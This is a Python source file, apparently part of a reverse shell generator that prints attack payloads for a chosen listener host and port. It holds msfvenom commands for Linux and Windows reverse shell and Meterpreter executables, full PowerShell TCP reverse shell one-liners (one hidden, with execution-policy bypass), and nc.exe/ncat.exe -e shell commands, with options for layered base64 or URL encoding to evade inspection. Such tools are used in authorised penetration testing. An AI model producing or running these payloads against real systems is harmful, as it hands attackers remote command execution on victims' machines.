    msfvenom_reverse_shell_unix_86_msg_format_Stageless  = Fore.RED + "[*] Msfvenom unix TCP reverse shell " + Fore.GREEN + "x86" + Fore.CYAN + " Stageless:" + Fore.RESET

    print('\n' + msfvenom_reverse_shell_unix_86_msg_format_Stageless )
    reverse_shell_separator(msg_msfvenom_reverse_shell_unix_86_Stageless )
    print(Fore.GREEN + "\n[*] PAYLOAD: \n" + Fore.RESET)
    print(msfvenom_reverse_shell_unix_86_Stageless  + '\n')



    print("\n•───────────────•( " + Fore.BLUE + "NON METERPRETER STAGED PAYLOADS" + Fore.RESET + " )•───────────────•\n")


    # msfvenom reverse shell TCP x64 Staged
    msfvenom_reverse_shell_unix_64_staged = f"msfvenom -p linux/x64/shell/reverse_tcp LHOST={user_lhost} LPORT={user_lport} -f elf > shell_x64_staged.elf"
    msg_msfvenom_reverse_shell_unix_64_staged = "[*] Msfvenom unix TCP reverse shell x64 Staged:"  
    msfvenom_reverse_shell_unix_64_msg_format_staged = Fore.RED + "[*] Msfvenom unix TCP reverse shell " + Fore.GREEN + "x64" + Fore.CYAN + " Staged:" + Fore.RESET
    
    print('\n' + msfvenom_reverse_shell_unix_64_msg_format_staged)
    reverse_shell_separator(msg_msfvenom_reverse_shell_unix_64_staged)
    print(Fore.GREEN + "\n[*] PAYLOAD: \n" + Fore.RESET)
    print(msfvenom_reverse_shell_unix_64_staged + '\n')


    # Msfvenom reverse shell TCP x86
    msfvenom_reverse_shell_unix_86_staged = f"msfvenom -p linux/x86/shell/reverse_tcp LHOST={user_lhost} LPORT={user_lport} -f elf > shell_x86_staged.elf"
    msg_msfvenom_reverse_shell_unix_86_staged = "[*] Msfvenom unix TCP reverse shell x86 Staged:"
    msfvenom_reverse_shell_unix_86_msg_format_staged = Fore.RED + "[*] Msfvenom unix TCP reverse shell " + Fore.GREEN + "x86" + Fore.CYAN + " Staged:" + Fore.RESET
    print('\n' + msfvenom_reverse_shell_unix_86_msg_format_staged)
    reverse_shell_separator(msg_msfvenom_reverse_shell_unix_86_staged)
    print(Fore.GREEN + "\n[*] PAYLOAD: \n" + Fore.RESET)
    print(msfvenom_reverse_shell_unix_86_staged + '\n')



    print("\n•───────────────•( " + Fore.BLUE + "METERPRETER STAGELESS PAYLOADS" + Fore.RESET + " )•───────────────•\n")


    # msfvenom meterpreter unix TCP x64 Stageless
    msfvenom_meterpreter_unix_64_Stageless = f"msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={user_lhost} LPORT={user_lport} -f elf > meterpreter_x64_stageless.elf"
    msg_msfvenom_meterpreter_unix_64_Stageless  = "[*] Msfvenom meterpreter unix TCP x64 Stageless:"
    msfvenom_meterpreter_unix_64_msg_format_Stageless  = Fore.RED + "[*] Msfvenom meterpreter unix TCP " + Fore.GREEN + "x64" + Fore.CYAN + " Stageless:" + Fore.RESET
    print('\n' + msfvenom_meterpreter_unix_64_msg_format_Stageless )
    reverse_shell_separator(msg_msfvenom_meterpreter_unix_64_Stageless )
    print(Fore.GREEN + "\n[*] PAYLOAD: \n" + Fore.RESET)
    print(msfvenom_meterpreter_unix_64_Stageless  + '\n')

    # Msfvenom meterpreter unix TCP x86 stageless
    msfvenom_meterpreter_unix_86_Stageless  = f"msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST={user_lhost} LPORT={user_lport} -f elf > meterpreter_x86_stageless.elf"
    msg_msfvenom_meterpreter_unix_86_Stageless  = "[*] Msfvenom meterpreter unix TCP x86 Stageless:"
    msfvenom_meterpreter_unix_86_msg_format_Stageless  = Fore.RED + "[*] Msfvenom meterpreter unix TCP " + Fore.GREEN + "x86" + Fore.CYAN + " Stageless:" + Fore.RESET

    print('\n' + msfvenom_meterpreter_unix_86_msg_format_Stageless )
    reverse_shell_separator(msg_msfvenom_meterpreter_unix_86_Stageless )
    print(Fore.GREEN + "\n[*] PAYLOAD: \n" + Fore.RESET)
    print(msfvenom_meterpreter_unix_86_Stageless  + '\n')  




    print("\n•───────────────•( " + Fore.BLUE + "METERPRETER STAGED PAYLOADS" + Fore.RESET + " )•───────────────•\n")
   
    # Msfvenom meterpreter TCP x64 Staged
    msfvenom_meterpreter_unix_64_staged = f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={user_lhost} LPORT={user_lport} -f elf > meterpreter_x64_staged.elf"
    msg_msfvenom_meterpreter_unix_64_staged = "[*] Msfvenom meterpreter unix TCP  x64 Staged:"
    msfvenom_meterpreter_unix_64_msg_format_staged = Fore.RED + "[*] Msfvenom meterpreter unix TCP " + Fore.GREEN + "x64" + Fore.CYAN + " Staged:" + Fore.RESET
    
    print(msfvenom_meterpreter_unix_64_msg_format_staged)
    reverse_shell_separator(msg_msfvenom_meterpreter_unix_64_staged)
    print(Fore.GREEN + "\n[*] PAYLOAD: \n" + Fore.RESET)
    print(msfvenom_meterpreter_unix_64_staged + '\n')

    # Msfvenom Meterpreter TCP x86 Staged
    msfvenom_meterpreter_unix_86_staged = f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={user_lhost} LPORT={user_lport} -f elf > merterpreter_x86_staged.elf"
    msg_msfvenom_meterpreter_unix_86_staged = "[*] Msfvenom meterpreter unix TCP x86 Staged:"
    msfvenom_meterpreter_unix_86_msg_format_staged = Fore.RED + "[*] Msfvenom meterpreter unix TCP " + Fore.GREEN + "x86" + Fore.CYAN + " Staged:" + Fore.RESET

    print('\n' + msfvenom_meterpreter_unix_86_msg_format_staged)
    reverse_shell_separator(msg_msfvenom_meterpreter_unix_86_staged)
    print(Fore.GREEN + "\n[*] PAYLOAD: \n" + Fore.RESET)
    print(msfvenom_meterpreter_unix_86_staged + '\n')



def Windows_revshells(user_shell_encode, user_number_encode, user_python_shell_version):

    if 'nc' in user_shell_language:
        check_unix_shell(user_unix_shell)
        print(banners["banner_nc"])
        nc_windows_shells(user_unix_shell, user_shell_encode, user_number_encode, user_lhost)

    if 'powershell' in user_shell_language:
        print(banners["banner_powershell"])
        powershells_windows_shells(user_shell_encode, user_number_encode, user_lhost)


    if 'msfvenom' in user_shell_language:
        print(banners["banner_msfvenom"])
        msfvenom_windows_payloads(user_lhost, user_lport)

    if 'all' in user_shell_language:

        check_unix_shell(user_unix_shell)
        
        print(banners["banner_powershell"])
        powershells_windows_shells(user_shell_encode, user_number_encode, user_lhost)

        print(banners["banner_nc"])
        nc_windows_shells(user_unix_shell, user_shell_encode, user_number_encode, user_lhost)

        print(banners["banner_msfvenom"])
        msfvenom_windows_payloads(user_lhost, user_lport)

def powershells_windows_shells(user_shell_encode, user_number_encode, user_lhost):
        
    # Powershell TCP Reverse Shell
    powershell_1_reverse_shell = f'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{user_lhost}\',{user_lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'VoidShell> \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"'
    msg_powershell_1 = "[*] Powershell TCP Reverse Shell:" 
    powershell_1_reverse_shell_msg_format = ('\n' + Fore.RED + msg_powershell_1 + Fore.RESET)
    encoder(powershell_1_reverse_shell, powershell_1_reverse_shell_msg_format, user_number_encode, user_shell_encode, msg_powershell_1)


    # Powershell TCP shell
    
    Powershell_3_reverse_shell = f'powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient(\'{user_lhost}\', {user_lport});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {{[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{0}};$StreamWriter.Write($String + \'VoidShell> \');$StreamWriter.Flush()}}WriteToStream \'\';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {{Invoke-Expression $Command 2>&1 | Out-String}} catch {{$_ | Out-String}}WriteToStream ($Output)}}$StreamWriter.Close()"'
    msg_powershell_2 = "[*] Powershell TCP Shell:"
    powershell_2_msg_format = ('\n' + Fore.RED + msg_powershell_2 + Fore.RESET)
    encoder(Powershell_3_reverse_shell, powershell_2_msg_format, user_number_encode, user_shell_encode, msg_powershell_2)

def nc_windows_shells(user_unix_shell, user_shell_encode, user_number_encode, user_lhost):

     for i in user_unix_shell:
        user_unix_shell = i

        user_unix_shell_banner(user_unix_shell)

        # Nc.exe
        netcat_exe_reverse_shell = f"nc.exe {user_lhost} {user_lport} -e /bin/{user_unix_shell}"
        msg_netcat_exe = "[*] Nc.exe Reverse shell:"
        netcat_exe_reverse_shell_msg_format = ('\n' + Fore.CYAN + msg_netcat_exe + Fore.RESET)
        encoder(netcat_exe_reverse_shell, netcat_exe_reverse_shell_msg_format, user_number_encode, user_shell_encode, msg_netcat_exe)


        # Ncat.exe
        netcat_exe_reverse_shell = f"ncat.exe {user_lhost} {user_lport} -e /bin/{user_unix_shell}"
        msg_netcat_exe = "[*] Ncat.exe Reverse shell:"
        netcat_exe_reverse_shell_msg_format = ('\n' + Fore.CYAN + msg_netcat_exe + Fore.RESET)
        encoder(netcat_exe_reverse_shell, netcat_exe_reverse_shell_msg_format, user_number_encode, user_shell_encode, msg_netcat_exe)


def msfvenom_windows_payloads(user_lhost, user_lport):

    print("\n•───────────────•( " + Fore.BLUE + "NON METERPRETER STAGELESS PAYLOADS" + Fore.RESET + " )•───────────────•\n")


    # msfvenom windows rerverse shell TCP x64 Stageless
    msfvenom_reverse_shell_windows_64_Stageless = f"msfvenom -p windows/shell_reverse_tcp LHOST={user_lhost} LPORT={user_lport} -f exe > shell_x64_Stageless.exe"
    msg_msfvenom_reverse_shell_windows_64_Stageless  = "[*] Msfvenom windows TCP reverse shell x64 Stageless:"
    msfvenom_reverse_shell_windows_64_msg_format_Stageless  = Fore.RED + "[*] Msfvenom windows TCP reverse shell " + Fore.GREEN + "x64" + Fore.CYAN + " Stageless:" + Fore.RESET
    
    print('\n' + msfvenom_reverse_shell_windows_64_msg_format_Stageless )
    reverse_shell_separator(msg_msfvenom_reverse_shell_windows_64_Stageless )
    print(Fore.GREEN + "\n[*] PAYLOAD: \n" + Fore.RESET)
    print(msfvenom_reverse_shell_windows_64_Stageless  + '\n')


    # Msfvenom windows reverse shell TCP x86 Stageless
    msfvenom_reverse_shell_windows_86_Stageless  = f"msfvenom -p windows/shell_reverse_tcp LHOST={user_lhost} LPORT={user_lport} -f exe > shell_x86_Stageless.exe"
    msg_msfvenom_reverse_shell_windows_86_Stageless  = "[*] Msfvenom windows TCP reverse shell x86 Stageless:"
    msfvenom_reverse_shell_windows_86_msg_format_Stageless  = Fore.RED + "[*] Msfvenom windows TCP reverse shell " + Fore.GREEN + "x86" + Fore.CYAN + " Stageless:" + Fore.RESET

    print('\n' + msfvenom_reverse_shell_windows_86_msg_format_Stageless )
    reverse_shell_separator(msg_msfvenom_reverse_shell_windows_86_Stageless )
    print(Fore.GREEN + "\n[*] PAYLOAD: \n" + Fore.RESET)
    print(msfvenom_reverse_shell_windows_86_Stageless  + '\n')



    print("\n•───────────────•( " + Fore.BLUE + "NON METERPRETER STAGED PAYLOADS" + Fore.RESET + " )•───────────────•\n")


    # msfvenom reverse shell TCP x64 Staged
    msfvenom_reverse_shell_windows_64_staged = f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={user_lhost} LPORT={user_lport} -f exe > shell_x64_staged.exe"
    msg_msfvenom_reverse_shell_windows_64_staged = "[*] Msfvenom windows TCP reverse shell x64 Staged:"  
    msfvenom_reverse_shell_windows_64_msg_format_staged = Fore.RED + "[*] Msfvenom windows TCP reverse shell " + Fore.GREEN + "x64" + Fore.CYAN + " Staged:" + Fore.RESET
    
    print('\n' + msfvenom_reverse_shell_windows_64_msg_format_staged)
    reverse_shell_separator(msg_msfvenom_reverse_shell_windows_64_staged)
    print(Fore.GREEN + "\n[*] PAYLOAD: \n" + Fore.RESET)
    print(msfvenom_reverse_shell_windows_64_staged + '\n')


    # Msfvenom reverse shell TCP x86
    msfvenom_reverse_shell_windows_86_staged = f"msfvenom -p windows/shell/reverse_tcp LHOST={user_lhost} LPORT={user_lport} -f exe > shell_x86_staged.exe"
    msg_msfvenom_reverse_shell_windows_86_staged = "[*] Msfvenom windows TCP reverse shell x86 Staged:"
    msfvenom_reverse_shell_windows_86_msg_format_staged = Fore.RED + "[*] Msfvenom windows TCP reverse shell " + Fore.GREEN + "x86" + Fore.CYAN + " Staged:" + Fore.RESET
    print('\n' + msfvenom_reverse_shell_windows_86_msg_format_staged)
    reverse_shell_separator(msg_msfvenom_reverse_shell_windows_86_staged)
    print(Fore.GREEN + "\n[*] PAYLOAD: \n" + Fore.RESET)
    print(msfvenom_reverse_shell_windows_86_staged + '\n')



    print("\n•───────────────•( " + Fore.BLUE + "METERPRETER STAGELESS PAYLOADS" + Fore.RESET + " )•───────────────•\n")


    # msfvenom meterpreter windows TCP x64 Stageless
    msfvenom_meterpreter_windows_64_Stageless = f"msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={user_lhost} LPORT={user_lport} -f exe > shell_x64_staged.exe"
    msg_msfvenom_meterpreter_windows_64_Stageless  = "[*] Msfvenom meterpreter windows TCP x64 Stageless:"
    msfvenom_meterpreter_windows_64_msg_format_Stageless  = Fore.RED + "[*] Msfvenom meterpreter windows TCP " + Fore.GREEN + "x64" + Fore.CYAN + " Stageless:" + Fore.RESET
    print('\n' + msfvenom_meterpreter_windows_64_msg_format_Stageless )
    reverse_shell_separator(msg_msfvenom_meterpreter_windows_64_Stageless )
    print(Fore.GREEN + "\n[*] PAYLOAD: \n" + Fore.RESET)
    print(msfvenom_meterpreter_windows_64_Stageless  + '\n')

    # Msfvenom meterpreter windows TCP x86 stageless
    msfvenom_meterpreter_windows_86_Stageless  = f"msfvenom -p windows/meterpreter_reverse_tcp LHOST={user_lhost} LPORT={user_lport} -f exe > shell-x86_stageless.exe"
    msg_msfvenom_meterpreter_windows_86_Stageless  = "[*] Msfvenom meterpreter windows TCP x86 Stageless:"
    msfvenom_meterpreter_windows_86_msg_format_Stageless  = Fore.RED + "[*] Msfvenom meterpreter windows TCP " + Fore.GREEN + "x86" + Fore.CYAN + " Stageless:" + Fore.RESET

    print('\n' + msfvenom_meterpreter_windows_86_msg_format_Stageless )
    reverse_shell_separator(msg_msfvenom_meterpreter_windows_86_Stageless )
    print(Fore.GREEN + "\n[*] PAYLOAD: \n" + Fore.RESET)
    print(msfvenom_meterpreter_windows_86_Stageless  + '\n')  




    print("\n•───────────────•( " + Fore.BLUE + "METERPRETER STAGED PAYLOADS" + Fore.RESET + " )•───────────────•\n")
   
    # Msfvenom meterpreter TCP x64 Staged
    msfvenom_meterpreter_windows_64_staged = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={user_lhost} LPORT={user_lport} -f exe > shell-x64.exe"
    msg_msfvenom_meterpreter_windows_64_staged = "[*] Msfvenom meterpreter windows TCP  x64 Staged:"
    msfvenom_meterpreter_windows_64_msg_format_staged = Fore.RED + "[*] Msfvenom meterpreter windows TCP " + Fore.GREEN + "x64" + Fore.CYAN + " Staged:" + Fore.RESET
    
    print(msfvenom_meterpreter_windows_64_msg_format_staged)
    reverse_shell_separator(msg_msfvenom_meterpreter_windows_64_staged)
    print(Fore.GREEN + "\n[*] PAYLOAD: \n" + Fore.RESET)
    print(msfvenom_meterpreter_windows_64_staged + '\n')

    # Msfvenom Meterpreter TCP x86 Staged
    msfvenom_meterpreter_windows_86_staged = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={user_lhost} LPORT={user_lport} -f exe > shell_x86_staged.exe"
    msg_msfvenom_meterpreter_windows_86_staged = "[*] Msfvenom meterpreter windows TCP x86 Staged:"
    msfvenom_meterpreter_windows_86_msg_format_staged = Fore.RED + "[*] Msfvenom meterpreter windows TCP " + Fore.GREEN + "x86" + Fore.CYAN + " Staged:" + Fore.RESET

    print('\n' + msfvenom_meterpreter_windows_86_msg_format_staged)
    reverse_shell_separator(msg_msfvenom_meterpreter_windows_86_staged)
    print(Fore.GREEN + "\n[*] PAYLOAD: \n" + Fore.RESET)
    print(msfvenom_meterpreter_windows_86_staged + '\n')




def reverse_shell_separator(msg):
    lenght = len(msg)
    separator = ("━" * lenght)
    
    print(separator)
    return
        
def user_unix_shell_banner(user_unix_shell):
    print("\n\n•───────────────•( " + Fore.BLUE + f"{user_unix_shell.upper()}" + Fore.RESET + " )•───────────────•")
    return

def not_user_unix_shell_banner():
    print("\n•───────────────•( " + Fore.BLUE + "UNIX SHELL INDEPENDENT" + Fore.RESET + " )•───────────────•")
    return



def encoder(shell, msg_shell, user_number_encode, user_shell_encode, msg_for_separator):
    
    print('\n' + msg_shell)
    reverse_shell_separator(msg_for_separator)
    print(Fore.GREEN + "\n[*] Plain text shells: \n" + Fore.RESET)
    print(shell)
        
    if 'base64' in user_shell_encode:
        print(Fore.GREEN + "\n[*] Base64 encoded shell: \n" + Fore.RESET)
        shell_base64 = shell
        for i in range(user_number_encode):
        
            shell_base64 = base64.b64encode(shell_base64.encode()).decode()

        print(shell_base64)
    if 'url' in user_shell_encode:

        print(Fore.GREEN + "\n[*] Url encoded shell: \n" + Fore.RESET)
        shell_url = shell
        for i in range(user_number_encode):

            shell_url = urllib.parse.quote(shell_url)

        print(shell_url)

def list_to_string(list):
    string_converted = ' '.join(list)
    return  string_converted






operative_systems_supported = ['windows', 'linux']

unix_code_languages_supported = ['python', 'php', 'ruby', 'perl', 'bash', 'nc', 'msfvenom', 'all']

windows_code_languages_supported = ['nc', 'powershell', 'msfvenom', 'all']


unix_shell_supported = ['sh','bash','zsh']

encode_types_supported = ['plain', 'url', 'base64']

banners = {

"banner_linux" : (Fore.BLUE + """ _____________________________________________________
|        .--.                                         |          
|       |o_o |         _     ___ _   _ _   ___  __    |  
|       |:_/ |        | |   |_ _| \ | | | | \ \/ /    |
|      //   \ \       | |    | ||  \| | | | |\  /     |
|     (|     | )      | |___ | || |\  | |_| |/  \     |
|    /'\_   _/`\      |_____|___|_| \_|\___//_/\_\    |
|    \___)=(___/                                      |
|_____________________________________________________|
""" + Fore.RESET),

"banner_windows" : (Fore.CYAN + """ ______________________________________________________________________
|                                                                      | 
|    __        ___           _                            _.-;;-._     | 
|    \ \      / (_)_ __   __| | _____      _____   '-..-'|   ||   |    | 
|     \ \ /\ / /| | '_ \ / _` |/ _ \ \ /\ / / __|  '-..-'|_.-;;-._|    |
|      \ V  V / | | | | | (_| | (_) \ V  V /\__ \  '-..-'|   ||   |    |
|       \_/\_/  |_|_| |_|\__,_|\___/ \_/\_/ |___/  '-..-'|_.-''-._|    |
|                                                                      |
|______________________________________________________________________|
""" + Fore.RESET),



"banner_python" : (Fore.YELLOW + """
 ____________________________________________
|     ____        _   _                     |
|    |  _ \ _   _| |_| |__   ___  _ __      |
|    | |_) | | | | __| '_ \ / _ \| '_ \     |
|    |  __/| |_| | |_| | | | (_) | | | |    |
|    |_|    \__, |\__|_| |_|\___/|_| |_|    |
|            |___/                          |
|___________________________________________|""" + Fore.RESET),

"banner_php" : (Fore.MAGENTA +"""
 ___________________________
|     ____  _   _ ____      |
|    |  _ \| | | |  _ \     |
|    | |_) | |_| | |_) |    |
|    |  __/|  _  |  __/     |
|    |_|   |_| |_|_|        |
|___________________________|""" + Fore.RESET),

"banner_ruby" : (Fore.RED +"""
 _________________________________
|     ____        _               |
|    |  _ \ _   _| |__  _   _     |
|    | |_) | | | | '_ \| | | |    |
|    |  _ <| |_| | |_) | |_| |    |
|    |_| \_\\\\__,_|_.__/ \__, |    |
|                       |___/     | 
|_________________________________|""" + Fore.RESET),

"banner_perl" : (Fore.WHITE + """
 _________________________________
|     ____  _____ ____  _         |
|    |  _ \| ____|  _ \| |        |
|    | |_) |  _| | |_) | |        |
|    |  __/| |___|  _ <| |___     |
|    |_|   |_____|_| \_\_____|    |
|_________________________________|
""" + Fore.RESET),

"banner_bash" : (Fore.LIGHTRED_EX + """
 __________________________________
|     ____    _    ____  _   _     |
|    | __ )  / \  / ___|| | | |    |
|    |  _ \ / _ \ \___ \| |_| |    |
|    | |_) / ___ \ ___) |  _  |    |
|    |____/_/   \_\____/|_| |_|    |
|__________________________________|""" + Fore.RESET),

"banner_nc" : (Fore.LIGHTCYAN_EX + """
 ____________________________________________
|     _   _ _____ _____ ____    _  _____     |
|    | \ | | ____|_   _/ ___|  / \|_   _|    |
|    |  \| |  _|   | || |     / _ \ | |      |
|    | |\  | |___  | || |___ / ___ \| |      |
|    |_| \_|_____| |_| \____/_/   \_\_|      |
|____________________________________________|    
""" + Fore.RESET),

"banner_cmd" : (Fore.WHITE + """
 ____________________________
|      ____ __  __ ____      |
|     / ___|  \/  |  _ \     |
|    | |   | |\/| | | | |    |
|    | |___| |  | | |_| |    |
|     \____|_|  |_|____/     |
|____________________________|
""" + Fore.RESET), 

"banner_powershell" : (Fore.LIGHTRED_EX + """
 _________________________________________________________________________
|     ____   _____        _______ ____  ____  _   _ _____ _     _         |
|    |  _ \ / _ \ \      / / ____|  _ \/ ___|| | | | ____| |   | |        |
|    | |_) | | | \ \ /\ / /|  _| | |_) \___ \| |_| |  _| | |   | |        |
|    |  __/| |_| |\ V  V / | |___|  _ < ___) |  _  | |___| |___| |___     |
|    |_|    \___/  \_/\_/  |_____|_| \_\____/|_| |_|_____|_____|_____|    |
|_________________________________________________________________________|
""" + Fore.RESET),

"banner_msfvenom" : (Fore.RED + """ 
 ________________________________________________________
|     __  __      __                                     |
|    |  \/  |___ / _|_   _____ _ __   ___  _ __ ___      |
|    | |\/| / __| |_\ \ / / _ \ '_ \ / _ \| '_ ` _ \     |
|    | |  | \__ \  _|\ V /  __/ | | | (_) | | | | | |    |
|    |_|  |_|___/_|   \_/ \___|_| |_|\___/|_| |_| |_|    |
|________________________________________________________|
""" + Fore.RESET)

}





if __name__ == '__main__':
    tool_banner()
    args = user_input()
    user_lhost = args.lhost
    user_lport = args.lport
    user_shell_language = args.language
    user_shell_encode = args.Encode
    user_number_encode = args.N_encoder
    user_operative_system = args.os
    user_unix_shell = args.Unix_shell
    user_python_shell_version = args.Pyversion 
    revshellgen(user_lhost, user_lport, user_shell_language, user_shell_encode, user_operative_system, user_python_shell_version, user_number_encode, user_unix_shell)

